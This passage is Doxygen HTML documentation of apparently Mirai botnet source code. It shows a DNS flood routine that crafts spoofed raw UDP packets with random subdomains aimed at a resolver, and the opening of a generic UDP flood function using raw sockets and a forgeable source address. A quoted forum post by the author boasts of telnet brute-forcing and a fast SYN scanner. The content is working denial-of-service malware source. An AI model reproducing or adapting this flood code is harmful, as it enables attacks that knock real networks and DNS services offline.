class="keyword">struct </span>udphdr *udph = (<span class="keyword">struct </span>udphdr *)(iph + 1);</div><div class="line"><a name="l00342"></a><span class="lineno">  342</span>&#160;            <span class="keyword">struct </span><a class="code" href="structdnshdr.html">dnshdr</a> *dnsh = (<span class="keyword">struct </span><a class="code" href="structdnshdr.html">dnshdr</a> *)(udph + 1);</div><div class="line"><a name="l00343"></a><span class="lineno">  343</span>&#160;            <span class="keywordtype">char</span> *qrand = ((<span class="keywordtype">char</span> *)(dnsh + 1)) + 1;</div><div class="line"><a name="l00344"></a><span class="lineno">  344</span>&#160;</div><div class="line"><a name="l00345"></a><span class="lineno">  345</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00346"></a><span class="lineno">  346</span>&#160;                iph-&gt;<a class="code" href="structdnshdr.html#a72d8ea566565d7c17e1cda9a6260be0b">id</a> = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00347"></a><span class="lineno">  347</span>&#160;            <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00348"></a><span class="lineno">  348</span>&#160;                udph-&gt;source = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00349"></a><span class="lineno">  349</span>&#160;            <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00350"></a><span class="lineno">  350</span>&#160;                udph-&gt;dest = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00351"></a><span class="lineno">  351</span>&#160;</div><div class="line"><a name="l00352"></a><span class="lineno">  352</span>&#160;            <span class="keywordflow">if</span> (dns_hdr_id == 0xffff)</div><div class="line"><a name="l00353"></a><span class="lineno">  353</span>&#160;                dnsh-&gt;<a class="code" href="structdnshdr.html#a72d8ea566565d7c17e1cda9a6260be0b">id</a> = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00354"></a><span class="lineno">  354</span>&#160;</div><div class="line"><a name="l00355"></a><span class="lineno">  355</span>&#160;            <a class="code" href="rand_8c.html#a600660d96f167d01ebcc62258688a921">rand_alphastr</a>((uint8_t *)qrand, data_len);</div><div class="line"><a name="l00356"></a><span class="lineno">  356</span>&#160;</div><div class="line"><a name="l00357"></a><span class="lineno">  357</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00358"></a><span class="lineno">  358</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00359"></a><span class="lineno">  359</span>&#160;</div><div class="line"><a name="l00360"></a><span class="lineno">  360</span>&#160;            udph-&gt;check = 0;</div><div class="line"><a name="l00361"></a><span class="lineno">  361</span>&#160;            udph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, udph, udph-&gt;len, sizeof (<span class="keyword">struct</span> udphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdnshdr.html">dnshdr</a>) + 1 + data_len + 2 + domain_len + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdns__question.html">dns_question</a>));</div><div class="line"><a name="l00362"></a><span class="lineno">  362</span>&#160;</div><div class="line"><a name="l00363"></a><span class="lineno">  363</span>&#160;            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;</div><div class="line"><a name="l00364"></a><span class="lineno">  364</span>&#160;            targs[i].sock_addr.sin_port = udph-&gt;dest;</div><div class="line"><a name="l00365"></a><span class="lineno">  365</span>&#160;            sendto(fd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdnshdr.html">dnshdr</a>) + 1 + data_len + 2 + domain_len + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdns__question.html">dns_question</a>), MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00366"></a><span class="lineno">  366</span>&#160;        }</div><div class="line"><a name="l00367"></a><span class="lineno">  367</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00368"></a><span class="lineno">  368</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00369"></a><span class="lineno">  369</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00370"></a><span class="lineno">  370</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00371"></a><span class="lineno">  371</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00372"></a><span class="lineno">  372</span>&#160;    }</div><div class="line"><a name="l00373"></a><span class="lineno">  373</span>&#160;}</div><div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="structdnshdr_html"><div class="ttname"><a href="structdnshdr.html">dnshdr</a></div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00007">protocol.h:7</a></div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_ae4b9f60da1e934a3855a3b52163fa058"><div class="ttname"><a href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain</a></div><div class="ttdeci">try harder skiddo Your skeleton tool sucks it thought the attack decoder was sinden but it does not even use a text based protocol CNC and bot communicate over binary protocol you say some others kill based on cwd It shows how out of the loop you are with real malware Go back to skidland slaps for you Why are you writing reverse engineer tools You cannot even correctly reverse in the first place Please learn some skills first before trying to impress others Your arrogance in declaring how you beat me with your dumb kung fu statement made me laugh so hard while eating my SO had to pat me on the back Just as I forever be you will be doomed to mediocracy forever Requirements Bare Minimum for scan and for loading Pro for scanReceiver and distributor server for bots resolve a domain(resolv.c/resolv.h) and connect to that IP address-Bots brute telnet using an advanced SYN scanner that is around 80x faster than the one in qbot</div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="structdnshdr_html_acfe83574de35456f80abcbc7d0fe8472"><div class="ttname"><a href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">dnshdr::opts</a></div><div class="ttdeci">uint16_t opts</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00008">protocol.h:8</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aaadf2e480fd246ff9e932039b223baed"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a></div><div class="ttdeci">uint32_t ipv4_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00013">includes.h:13</a></div></div>
<div class="ttc" id="attack_8h_html_acfa2ed8a557040aed04b6c9346aa0eb9"><div class="ttname"><a href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a></div><div class="ttdeci">#define ATK_OPT_IP_TTL</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00050">attack.h:50</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a181a242a15f441fe3eefe68330b0c8e3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a></div><div class="ttdeci">int util_strlen(char *str)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00021">util.c:21</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="protocol_8h_html_a83ac410cc49f839586f7c3f67c82a8fd"><div class="ttname"><a href="protocol_8h.html#a83ac410cc49f839586f7c3f67c82a8fd">PROTO_DNS_QTYPE_A</a></div><div class="ttdeci">#define PROTO_DNS_QTYPE_A</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00025">protocol.h:25</a></div></div>
<div class="ttc" id="structdns__question_html_a28612cf31ea9061817c7652d97f68f10"><div class="ttname"><a href="structdns__question.html#a28612cf31ea9061817c7652d97f68f10">dns_question::qtype</a></div><div class="ttdeci">uint16_t qtype</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00012">protocol.h:12</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="protocol_8h_html_a901b19f9dfb79c07984d5f8bf8b2a62c"><div class="ttname"><a href="protocol_8h.html#a901b19f9dfb79c07984d5f8bf8b2a62c">PROTO_DNS_QCLASS_IP</a></div><div class="ttdeci">#define PROTO_DNS_QCLASS_IP</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00026">protocol.h:26</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a4d0115976f56267c42e6a09ff3651c02"><div class="ttname"><a href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a></div><div class="ttdeci">#define ATK_OPT_SPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00052">attack.h:52</a></div></div>
<div class="ttc" id="attack_8c_html_a79b03d7c093d14a1640b2e5bcf2c3c38"><div class="ttname"><a href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a></div><div class="ttdeci">char * attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00193">attack.c:193</a></div></div>
<div class="ttc" id="mirai_2bot_2util_8c_html_a8654e276185a2f53935614d38f4117f3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a></div><div class="ttdeci">void util_memcpy(void *dst, void *src, int len)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00072">util.c:72</a></div></div>
<div class="ttc" id="attack_8h_html_a6fb76834fa13fd65a0021d1860b6c1d6"><div class="ttname"><a href="attack_8h.html#a6fb76834fa13fd65a0021d1860b6c1d6">ATK_OPT_DNS_HDR_ID</a></div><div class="ttdeci">#define ATK_OPT_DNS_HDR_ID</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00055">attack.h:55</a></div></div>
<div class="ttc" id="attack_8h_html_a4c326567294cc6655e9f6a380c7f736f"><div class="ttname"><a href="attack_8h.html#a4c326567294cc6655e9f6a380c7f736f">ATK_OPT_DOMAIN</a></div><div class="ttdeci">#define ATK_OPT_DOMAIN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00054">attack.h:54</a></div></div>
<div class="ttc" id="attack_8h_html_a57162ecbd3f7644a8f6a6b58aa4f8596"><div class="ttname"><a href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a></div><div class="ttdeci">#define ATK_OPT_IP_DF</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00051">attack.h:51</a></div></div>
<div class="ttc" id="structdns__question_html"><div class="ttname"><a href="structdns__question.html">dns_question</a></div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00011">protocol.h:11</a></div></div>
<div class="ttc" id="structdns__question_html_afe96f7c0e33a7f83e289140633217017"><div class="ttname"><a href="structdns__question.html#afe96f7c0e33a7f83e289140633217017">dns_question::qclass</a></div><div class="ttdeci">uint16_t qclass</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00012">protocol.h:12</a></div></div>
<div class="ttc" id="attack_8h_html_a1ac4210e00c74506c31642a74e3fc1c7"><div class="ttname"><a href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a></div><div class="ttdeci">#define ATK_OPT_IP_TOS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00048">attack.h:48</a></div></div>
<div class="ttc" id="structdnshdr_html_a72d8ea566565d7c17e1cda9a6260be0b"><div class="ttname"><a href="structdnshdr.html#a72d8ea566565d7c17e1cda9a6260be0b">dnshdr::id</a></div><div class="ttdeci">uint16_t id</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00008">protocol.h:8</a></div></div>
<div class="ttc" id="attack_8h_html_aacac129514ea3914af56b5eb4c71f8c6"><div class="ttname"><a href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00046">attack.h:46</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="attack__udp_8c_html_adfa54637caaee478d9038b78415a8d7f"><div class="ttname"><a href="attack__udp_8c.html#adfa54637caaee478d9038b78415a8d7f">get_dns_resolver</a></div><div class="ttdeci">static ipv4_t get_dns_resolver(void)</div><div class="ttdef"><b>Definition:</b> <a href="attack__udp_8c_source.html#l00479">attack_udp.c:479</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="structdnshdr_html_a85cb57fcbd654e84d28c30e5bfa844c4"><div class="ttname"><a href="structdnshdr.html#a85cb57fcbd654e84d28c30e5bfa844c4">dnshdr::qdcount</a></div><div class="ttdeci">uint16_t qdcount</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00008">protocol.h:8</a></div></div>
<div class="ttc" id="attack_8h_html_aecb175215ca3d0ce5017cd8cedb7e0fe"><div class="ttname"><a href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a></div><div class="ttdeci">#define ATK_OPT_IP_IDENT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00049">attack.h:49</a></div></div>
<div class="ttc" id="rand_8c_html_a600660d96f167d01ebcc62258688a921"><div class="ttname"><a href="rand_8c.html#a600660d96f167d01ebcc62258688a921">rand_alphastr</a></div><div class="ttdeci">void rand_alphastr(uint8_t *str, int len)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00056">rand.c:56</a></div></div>
<div class="ttc" id="protocol_8h_html_ad1a572736a10ff6b282c5f43c4ea1ccf"><div class="ttname"><a href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a></div><div class="ttdeci">uint16_t data_len</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00483">protocol.h:483</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a793fdfa64aaad657551cc649e2988a81"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_udp_generic </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__udp_8c_source.html#l00025">25</a> of file <a class="el" href="attack__udp_8c_source.html">attack_udp.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00051">ATK_OPT_IP_DF</a>, <a class="el" href="attack_8h_source.html#l00049">ATK_OPT_IP_IDENT</a>, <a class="el" href="attack_8h_source.html#l00048">ATK_OPT_IP_TOS</a>, <a class="el" href="attack_8h_source.html#l00050">ATK_OPT_IP_TTL</a>, <a class="el" href="attack_8h_source.html#l00047">ATK_OPT_PAYLOAD_RAND</a>, <a class="el" href="attack_8h_source.html#l00046">ATK_OPT_PAYLOAD_SIZE</a>, <a class="el" href="attack_8h_source.html#l00071">ATK_OPT_SOURCE</a>, <a class="el" href="attack_8h_source.html#l00052">ATK_OPT_SPORT</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="checksum_8c_source.html#l00009">checksum_generic()</a>, <a class="el" href="checksum_8c_source.html#l00024">checksum_tcpudp()</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="protocol_8h_source.html#l00483">data_len</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00009">FALSE</a>, <a class="el" href="mirai_2bot_2includes_8h_source.html#l00031">LOCAL_ADDR</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="rand_8c_source.html#l00032">rand_str()</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, and <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00026"></a><span class="lineno">   26</span>&#160;{</div><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;    <span class="keywordtype">int</span> i, fd;</div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, <a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a>, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, <a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a>, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, <a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a>, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, <a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a>, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, <a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a>, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, <a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a>, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;    uint16_t <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, <a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a>, <a class="code" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>, 512);</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> data_rand = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, <a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a>, <a class="code" href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;    uint32_t source_ip = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, <a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a>, <a class="code" href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a>, <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>);</div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;</div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;    <span class="keywordflow">if</span> (data_len &gt; 1460)</div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;        data_len = 1460;</div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)</div><div class="line"><a name="l00043"></a><span class="lineno">   43</span>&#160;    {</div><div class="line"><a name="l00044"></a><span class="lineno">   44</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00045"></a><span class="lineno">   45</span>&#160;        printf(<span class="stringliteral">&quot;Failed to create raw socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00046"></a><span class="lineno">   46</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00047"></a><span class="lineno">   47</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00048"></a><span class="lineno">   48</span>&#160;    }</div><div class="line"><a name="l00049"></a><span class="lineno">   49</span>&#160;    i = 1;</div><div class="line"><a name="l00050"></a><span class="lineno">   50</span>&#160;    <span class="keywordflow">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00051"></a><span class="lineno">   51</span>&#160;    {</div><div class="line"><a name="l00052"></a><span class="lineno">   52</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00054"></a><span class="lineno">   54</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00056"></a><span class="lineno">   56</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;    }</div><div class="line"><a name="l00058"></a><span class="lineno">   58</span>&#160;</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00060"></a><span class="lineno">   60</span>&#160;    {</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00062"></a><span class="lineno">   62</span>&#160;        <span class="keyword">struct </span>udphdr *udph;</div><div class="line"><a name="l00063"></a><span class="lineno">   63</span>&#160;</div><div 